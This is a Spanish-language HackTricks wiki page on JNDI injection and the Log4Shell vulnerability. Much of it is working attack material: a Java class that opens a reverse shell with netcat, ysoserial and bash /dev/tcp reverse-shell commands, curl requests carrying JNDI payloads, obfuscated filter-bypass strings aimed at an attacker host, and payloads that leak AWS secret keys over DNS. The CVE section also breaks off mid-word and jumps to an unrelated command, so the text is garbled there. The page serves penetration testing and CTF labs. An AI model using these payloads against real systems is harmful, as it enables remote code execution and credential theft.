# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan más para que puedas arreglarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Información Básica

JNDI ha estado presente en Java desde finales de los años 90. Es un servicio de directorio que **permite a un programa Java encontrar datos a través de un directorio utilizando un servicio de nombres**. Un servicio de nombres asocia valores (enlaces), por lo que se puede obtener a través de su referencia en el directorio.

JNDI tiene una serie de **interfaces de proveedor de servicios** (SPIs) que le permiten utilizar una variedad de servicios de directorio. El objetivo de JNDI es obtener datos de otros sistemas muy fácilmente. Incluso puedes obtener objetos Java de forma remota, y aquí es donde surge un problema.

Por ejemplo, existen SPIs para el **CORBA COS** (Common Object Service), el **Java RMI** (Remote Method Interface) Registry y **LDAP**.

![](<../../.gitbook/assets/image (627).png>)

### Referencia de Nombres JNDI

Para recuperar Objetos Java podrías serializarlos y guardar la representación binaria. Pero hay casos en los que esto no funcionará (quizás porque los datos son demasiado grandes, o cualquier otra cosa).\
Para guardar Objetos Java más fácilmente, se utilizan **Referencias de Nombres**.\
Hay 2 tipos de Referencias de Nombres:

* **Direcciones de Referencia**: Esto indica la dirección del Objeto (_rmi://server/ref_), luego el **objeto será recuperado de esa dirección**.
* **Fábrica Remota**: En este caso se señalará una **clase de fábrica remota** en la referencia JNDI, luego, siguiendo la dirección JNDI, la clase remota será tomada de la fábrica remota y la **clase será descargada y cargada**.

Esto es peligroso porque **los atacantes pueden hacer que el sistema cargue objetos arbitrarios y ejecute código arbitrario**, por lo tanto, existen algunas protecciones:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` por defecto desde **JDK 7u21**, de lo contrario permitirá cargar objetos Java personalizados de forma remota. Además, incluso si la protección está deshabilitada, se impone un **Security Manager** para configurar qué se puede cargar.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` por defecto desde **JDK** **6u141, 7u131, 8u121**, y no permitirá ejecutar objetos Java arbitrarios descargados. Pero si esto se establece en `true`, lo hará y **no se impondrá ningún Security Manager**.
* **CORBA**: No hay ninguna propiedad que configurar pero el **Security Manager siempre se impone**.

Además, el **Naming Manager**, el que va a seguir los enlaces JNDI, no tiene ningún Security Manager o propiedad que configurar, por lo que siempre intentará obtener el objeto.

Como puedes ver, las **protecciones en general no son suficientes** porque no hay **protección contra la carga de JNDI desde direcciones aleatorias** y las protecciones de RMI, LDAP y CORBA podrían ser eludidas (dependiendo de la configuración) para **cargar objetos Java arbitrarios** o para **cargar objetos Java** que abusarán de componentes existentes en la aplicación como **gadgets para ejecutar código arbitrario**.

Ejemplos de URLs para abusar de JNDI:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### Ejemplo de JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Incluso si has establecido un **`PROVIDER_URL`**, puedes indicar uno diferente en una búsqueda y se accederá a él: `ctx.lookup("<attacker-controlled-url>")` y eso es lo que un atacante abusará para cargar objetos arbitrarios desde un sistema controlado por él.

### CORBA

Un **Interoperable Object Reference (IOR)** es una referencia CORBA o RMI-IIOP que identifica de manera única a un objeto en un servidor CORBA remoto. Los IOR pueden estar en formato binario o en representación hexadecimal de cadena del binario.\
Entre otra información, contiene el **Type ID** (un identificador único para una interfaz) y el **Codebase** (ubicación remota utilizada para obtener la clase stub).\
Ten en cuenta que **por defecto CORBA no puede ser abusado**.\
Requiere:

* Se debe instalar un **Security Manager**
* La conexión al **codebase controlado por el atacante debe ser permitida** por el Security Manager. Hay diferentes formas de permitir esto:
* Permiso de socket: `permissions java.net.SocketPermission "*:1098-1099", "connect";`
* Permiso de archivo que permite leer todos los archivos: `permission java.io.FilePermission "<<ALL FILES>>", "read";`
* Permiso de archivo para leer la carpeta donde el atacante puede subir los exploits (clases o archivo zip)

Puede que encuentres **políticas de proveedores que permiten esto por defecto**.

### RMI

Como se indicó en la sección anterior **Referencia de Nombres JNDI, RMI por defecto no permitirá descargar Clases Java arbitrarias**. Y además, incluso si lo hiciera, necesitarás **eludir las políticas del Security Manager** (en la sección anterior aprendimos que esto era posible con CORBA).

### LDAP

Primero que nada, necesitamos distinguir entre una Búsqueda y una Búsqueda de Nombres.\
Una **búsqueda** usará una URL como `ldap://localhost:389/o=JNDITutorial` para encontrar el objeto JNDITutorial de un servidor LDAP y **recuperar sus atributos**.\
Una **búsqueda de nombres** está destinada a **servicios de nombres** ya que queremos obtener **lo que sea que esté vinculado a un nombre**.

Si la búsqueda LDAP se invocó con **SearchControls.setReturningObjFlag() con `true`, entonces el objeto devuelto será reconstruido**.

Por lo tanto, hay varias formas de atacar estas opciones.\
Un **atacante puede envenenar registros LDAP introduciendo payloads** en ellos que se ejecutarán en los sistemas que los recojan (muy útil para **comprometer decenas de máquinas** si tienes acceso al servidor LDAP). Otra forma de explotar esto sería realizar un **ataque MitM en una búsqueda LDAP**, por ejemplo.

En caso de que puedas **hacer que una app resuelva una URL JNDI LDAP**, puedes controlar el LDAP que se buscará, y podrías enviar de vuelta el exploit (log4shell).

#### Explotación de Deserialización

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

El **exploit está serializado** y será deserializado.\
En caso de que `trustURLCodebase` sea `true`, un atacante puede proporcionar sus propias clases en el codebase si no, necesitará abusar de gadgets en el classpath.

#### Explotación de Referencia JNDI

Es más fácil atacar este LDAP utilizando **referencias JavaFactory**:

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Vulnerabilidad Log4Shell

La vulnerabilidad se introduce en Log4j porque admite una [**sintaxis especial**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) en la forma `${prefix:name}` donde `prefix` es uno de varios [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) diferentes donde `name` debe ser evaluado. Por ejemplo, `${java:version}` es la versión actual en ejecución de Java.

En [**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) se agregó un Lookup `jndi` de la siguiente manera: "El JndiLookup permite que las variables se recuperen a través de JNDI. Por defecto, la clave se prefijará con java:comp/env/, sin embargo, si la clave contiene un **":" no se agregará ningún prefijo**."

Con un **: presente** en la clave, como en `${jndi:ldap://example.com/a}` no hay **prefijo** y se **consulta al servidor LDAP por el objeto**. Y estos Lookups se pueden usar tanto en la configuración de Log4j como cuando se registran líneas.

Por lo tanto, lo único necesario para obtener RCE es una **versión vulnerable de Log4j procesando información controlada por el usuario**. Y debido a que esta es una biblioteca ampliamente utilizada por aplicaciones Java para registrar información (incluidas aplicaciones orientadas a Internet), era muy común tener log4j registrando, por ejemplo, encabezados HTTP recibidos como el User-Agent. Sin embargo, log4j **no se usa solo para registrar información HTTP sino cualquier entrada** y datos que el desarrollador indicó.

## CVEs de Log4Shell

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Crítico]**: La vulnerabilidad original 'Log4Shell' es un fallo de [deserialización no confiable](https://cwe.mitre.org/data/definitions/502.html). Calificada como crítica en severidad, esta obtiene un 10 en la escala [CVSS](https://www.first.org/cvss/) y **otorga capacidades de ejecución de código remoto (RCE) a atacantes no autenticados**, permitiendo la toma de control completa del sistema.\
\
Reportado por Chen Zhaojun del Equipo de Seguridad de Alibaba Cloud a Apache el 24 de noviembre, CVE-2021-44228 afecta las configuraciones predeterminadas de múltiples marcos de Apache, incluidos Apache Struts2, Apache Solr, Apache Druid, Apache Flink y otros.\
\
Siendo la más peligrosa de todas, esta vulnerabilidad se encuentra en el componente [log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core), limitado a versiones 2.x: desde 2.0-beta9 hasta e incluyendo 2.14.1. Se implementó una solución para Log4Shell en la versión 2.15.0 pero se consideró incompleta (sigue leyendo).\
\
El analista de inteligencia de amenazas Florian Roth compartió reglas Sigma \[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)] que se pueden emplear como una de las defensas.\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**Crítico**, previamente Bajo]: Este es un fallo de Denegación de Servicio (DoS) con una puntuación de ~~3.7~~ 9.0. El fallo surgió como resultado de una **solución incompleta que se introdujo en 2.15.0** para CVE-2021-44228. Mientras que la solución aplicada a 2.15.0 resolvió en gran medida el fallo, ese no fue del todo el caso para ciertas **configuraciones no predeterminadas**.\
\
Log4j 2.15.0 hace "un intento de mejor esfuerzo" para **restringir las búsquedas LDAP JNDI a \_localhost**\_ por defecto. Pero, **los atacantes** que tienen **control** sobre los datos de entrada del **Mapa de Contexto de Hilos (MDC)** pueden crear payloads maliciosos a través de los patrones de Búsqueda JNDI para causar ataques DoS. Esto se aplica a configuraciones no predeterminadas en las que se utiliza un Patrón de Diseño no predeterminado usando ya sea una Búsqueda de Contexto, por ejemplo, \$${ctx:loginId}, o un patrón de Mapa de Contexto de Hilos (%X, %mdc, o %MDC).\
\
El **bypass tomado de este** [**tweet**](https://twitter.com/marcioalm/status/1471740771581652995) fue:\
_Aquí hay un PoC en cómo eludir las comprobaciones de allowedLdapHost y allowedClasses en Log4J 2.15.0. para lograr RCE: **`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`** y para eludir allowedClasses solo elige un nombre para una clase en el JDK. La deserialización ocurrirá como de costumbre._\
\_\_\
\_\_"Log4j 2.16.0 soluciona este problema eliminando el soporte para patrones de búsqueda de mensajes y deshabilitando la funcionalidad JNDI por defecto", afirma el aviso de NVD. Para aquellos en la rama 2.12.1, se realizó una corrección en 2.12.2.\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Alto]**: ¿Dijimos que las versiones de Log4j 2.x eran vulnerables? ¿Qué pasa con **Log4j 1.x**?\
\
Aunque anteriormente se pensaba que era seguro, Log4Shell encontró una forma de acechar en el Log4j más antiguo también. Esencialmente, **configuración no predeterminada de instancias de Log4j 1.x usando la clase \_JMSAppender**\_\*\* también se vuelven susceptibles al fallo de deserialización no confiable\*\*.\
\
Aunque es una variante menos grave de CVE-2021-44228, no obstante, este CVE afecta a todas las versiones de los componentes [log4j:log4j](https://search.maven.org/artifact/log4j/log4j) y [org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j) para los cuales solo existen lanzamientos 1.x. Debido a que estas son versiones [fin de vida](https://logging.apache.org/log4j/1.2/), **no existe una solución para la rama 1.x en ningún lugar**, y se debe actualizar a _log4j-core_ 2.17.0. (Aparentemente 1.0 no es vulnerable).\\
* [**CVE-2021-42550**](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderado]:** Esta es una vulnerabilidad en el **marco de registro Logback**. Un sucesor de la biblioteca Log4j 1.x, Logback afirma continuar "donde log4j 1.x se detiene".\
\
Hasta la semana pasada, Logback también [presumía](https://archive.md/QkzIy) que al ser "no relacionado con log4j 2.x, \[logback] no comparte sus vulnerabilidades".\
\
Esa suposición se desvaneció rápidamente cuando se descubrió que **CVE-202
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verificación**

Algunas de las plataformas mencionadas anteriormente permitirán insertar datos variables que se registrarán cuando se soliciten.\
Esto puede ser muy útil para 2 cosas:

* Para **verificar** la vulnerabilidad
* Para **exfiltrar información** abusando de la vulnerabilidad

Por ejemplo, podrías solicitar algo como:\
o como `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** y si se **recibe una solicitud DNS con el valor de la variable de entorno**, sabes que la aplicación es vulnerable.

Otra información que podrías intentar **exfiltrar**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Información sobre RCE

{% hint style="info" %}
Hosts que ejecutan en **versiones de JDK superiores a 6u141, 7u131, 8u121 estarán protegidos contra el vector de carga de clases LDAP** **PERO NO contra el vector de deserialización**. Esto se debe a que `com.sun.jndi.ldap.object.trustURLCodebase` está deshabilitado por defecto, por lo tanto, JNDI no puede cargar un codebase remoto usando LDAP. Pero debemos enfatizar que la deserialización y las fugas de variables aún son posibles.\
Esto significa que para **explotar las versiones mencionadas** necesitarás **abusar de algún gadget de confianza** que exista en la aplicación java (usando ysoserial o JNDIExploit, por ejemplo). Pero para explotar versiones inferiores, puedes hacer que carguen y ejecuten clases arbitrarias (lo que facilita el ataque).

Para **más información** (_como limitaciones en los vectores RMI y CORBA_) **consulta la sección anterior de Referencia de Nombres JNDI** o [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec con payload personalizado

_Este truco se toma íntegramente de la **caja THM:**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)___

Para este exploit, se utilizará la herramienta [**marshalsec**](https://github.com/mbechler/marshalsec) (descarga una [**versión jar de aquí**](https://github.com/RandomRobbieBF/marshalsec-jar)) para crear un servidor de referencias LDAP para dirigir conexiones a nuestro servidor HTTP secundario donde se servirá el exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Queremos que la víctima cargue el código que nos enviará una reverse shell, así que puedes crear un archivo java llamado Exploit.java con el siguiente contenido:

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
```markdown
{% endcode %}

Cree el **archivo de clase** ejecutando: `javac Exploit.java -source 8 -target 8` y luego ejecute un **servidor HTTP** en el mismo directorio donde se creó el archivo de clase: `python3 -m http.server`.\
El **servidor LDAP de marshalsec debe apuntar a este servidor HTTP**.\
Luego, puede hacer que el **servidor web vulnerable ejecute la clase de exploit** enviando un payload como:
```
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
_Tenga en cuenta que si Java no está configurado para cargar código remoto usando LDAP, este exploit personalizado no funcionará. En ese caso, necesitará abusar de una clase de confianza para ejecutar código arbitrario._

### RCE - **JNDIExploit**

{% hint style="info" %}
Note que por alguna razón el autor eliminó este proyecto de github después del descubrimiento de log4shell. Puede encontrar una versión en caché en [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) pero si desea respetar la decisión del autor, use un método diferente para explotar esta vulnerabilidad.

Además, no puede encontrar el código fuente en wayback machine, así que o analiza el código fuente, o ejecuta el jar sabiendo que no sabes lo que estás ejecutando.
{% endhint %}

Para este ejemplo, simplemente puede ejecutar este **servidor web vulnerable a log4shell** en el puerto 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_en el README encontrará cómo ejecutarlo_). Esta aplicación vulnerable está registrando con una versión vulnerable de log4shell el contenido del encabezado de solicitud HTTP _X-Api-Version_.

Luego, puede descargar el archivo jar de **JNDIExploit** y ejecutarlo con:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Después de leer el código solo un par de minutos, en _com.feihong.ldap.LdapServer_ y _com.feihong.ldap.HTTPServer_ puedes ver cómo se crean los **servidores LDAP y HTTP**. El servidor LDAP entenderá qué payload necesita ser servido y redirigirá a la víctima al servidor HTTP, el cual servirá el exploit.
En _com.feihong.ldap.gadgets_ puedes encontrar **algunos gadgets específicos** que pueden ser utilizados para ejecutar la acción deseada (potencialmente ejecutar código arbitrario). Y en _com.feihong.ldap.template_ puedes ver las diferentes clases de plantilla que **generarán los exploits**.

Puedes ver todos los exploits disponibles con **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Algunos útiles son:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Entonces, en nuestro ejemplo, ya tenemos esa aplicación vulnerable en docker en ejecución. Para atacarla:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Al enviar los ataques, verás algunas salidas en la terminal donde ejecutaste **JNDIExploit-1.2-SNAPSHOT.jar**.

**Recuerda revisar `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` para otras opciones de explotación. Además, en caso de que lo necesites, puedes cambiar el puerto de los servidores LDAP y HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

De manera similar al exploit anterior, puedes intentar usar [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para explotar esta vulnerabilidad.\
Puedes generar las URLs para enviar a la víctima ejecutando:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Este ataque utilizando un objeto java generado personalizado funcionará en laboratorios como la **sala solar THM**. Sin embargo, generalmente no funcionará (ya que por defecto Java no está configurado para cargar una base de código remota usando LDAP) creo que es porque no está abusando de una clase de confianza para ejecutar código arbitrario._

### RCE - ysoserial & JNDI-Exploit-Kit

Esta opción es realmente útil para atacar **versiones de Java configuradas para confiar solo en clases especificadas y no en todas**. Por lo tanto, **ysoserial** se utilizará para generar **serializaciones de clases de confianza** que pueden usarse como gadgets para **ejecutar código arbitrario** (_la clase de confianza abusada por ysoserial debe ser utilizada por el programa java víctima para que el exploit funcione_).

Usando **ysoserial** o [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) puedes crear el exploit de deserialización que será descargado por JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Utiliza [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para generar **enlaces JNDI** donde el exploit estará esperando conexiones de las máquinas vulnerables. Puedes servir **diferentes exploits que pueden ser generados automáticamente** por el JNDI-Exploit-Kit o incluso **tus propios payloads de deserialización** (generados por ti o ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Ahora puedes usar fácilmente un enlace JNDI generado para explotar la vulnerabilidad y obtener un **reverse shell** simplemente enviándolo a una versión vulnerable de log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### Escáneres Automáticos

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Encuentra bibliotecas locales vulnerables

### Laboratorios para probar

* [**Máquina LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**Sala Solar de Try Hack Me**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Explotación Post-Log4Shell

En este [**writeup de CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) se explica bien cómo es **posible** **abusar** de algunas características de **Log4J**.

La [**página de seguridad**](https://logging.apache.org/log4j/2.x/security.html) de Log4j tiene algunas frases interesantes:

> Desde la versión 2.16.0 (para Java 8), la **función de búsquedas de mensajes ha sido completamente eliminada**. **Las búsquedas en la configuración aún funcionan**. Además, Log4j ahora deshabilita el acceso a JNDI por defecto. Las búsquedas de JNDI en la configuración ahora necesitan ser habilitadas explícitamente.

> Desde la versión 2.17.0, (y 2.12.3 y 2.3.1 para Java 7 y Java 6), **solo las cadenas de búsqueda en la configuración se expanden de manera recursiva**; en cualquier otro uso, solo se resuelve la búsqueda de nivel superior, y no se resuelven las búsquedas anidadas.

Esto significa que por defecto puedes **olvidarte de usar cualquier exploit de `jndi`**. Además, para realizar **búsquedas recursivas** necesitas tenerlas configuradas.

Por ejemplo, en ese CTF esto estaba configurado en el archivo log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Búsquedas en Env

En este CTF, el atacante controlaba el valor de `${sys:cmd}` y necesitaba exfiltrar la flag de una variable de entorno.\
Como se vio en esta página en [**cargas útiles anteriores**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), hay diferentes formas de acceder a las variables de entorno, como: **`${env:FLAG}`**. En este CTF esto no era útil, pero podría no serlo en otros escenarios de la vida real.

### Exfiltración en Excepciones

En el CTF, **no podías acceder al stderr** de la aplicación java que usaba log4J, pero las **excepciones de Log4J se envían a stdout**, que se imprimía en la aplicación de python. Esto significaba que al provocar una excepción podríamos acceder al contenido. Una excepción para exfiltrar la flag era: **`${java:${env:FLAG}}`.** Esto funciona porque **`${java:CTF{blahblah}}`** no existe y se mostrará una excepción con el valor de la flag:

![](<../../.gitbook/assets/image (157).png>)

### Excepciones de Patrones de Conversión

Solo para mencionarlo, también podrías inyectar nuevos [**patrones de conversión**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) y provocar excepciones que se registrarán en `stdout`. Por ejemplo:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Esto no se encontró útil para exfiltrar datos dentro del mensaje de error, porque la búsqueda no se resolvía antes del patrón de conversión, pero podría ser útil para otras cosas, como la detección.

### Patrones de Conversión con Regex

Sin embargo, es posible usar algunos **patrones de conversión que admiten regex** para exfiltrar información de una búsqueda utilizando regex y abusando de comportamientos de **búsqueda binaria** o **basados en tiempo**.

* **Búsqueda binaria a través de mensajes de excepción**

El patrón de conversión **`%replace`** se puede usar para **reemplazar** **contenido** de un **string** incluso usando **regexes**. Funciona así: `replace{pattern}{regex}{substitution}`\
Abusando de este comportamiento podrías hacer que replace **provoque una excepción si el regex coincidía** con algo dentro del string (y ninguna excepción si no se encontraba) de esta manera:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Basado en tiempo**

Como se mencionó en la sección anterior, **`%replace`** soporta **regexes**. Por lo tanto, es posible usar un payload de la [**página ReDoS**](../regular-expression-denial-of-service-redos.md) para causar un **timeout** en caso de que se encuentre la bandera.\
Por ejemplo, un payload como `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` provocaría un **timeout** en ese CTF.

En este [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), en lugar de usar un ataque ReDoS, se utilizó un **ataque de amplificación** para causar una diferencia de tiempo en la respuesta:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Si la bandera comienza con `flagGuess`, toda la bandera se reemplaza con 29 `#` (utilicé este carácter porque probablemente no sería parte de la bandera). **Cada uno de los 29 `#` resultantes se reemplaza entonces por 54 `#`**. Este proceso se repite **6 veces**, lo que lleva a un total de `29*54*54^6* =`` `` `**`96816014208`  `#`-s!**
>
> Reemplazar tantos `#` provocará el timeout de 10 segundos de la aplicación Flask, lo que a su vez resultará en el código de estado HTTP 500 que se enviará al usuario. (Si la bandera no comienza con `flagGuess`, recibiremos un código de estado que no es 500)

## Referencias

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
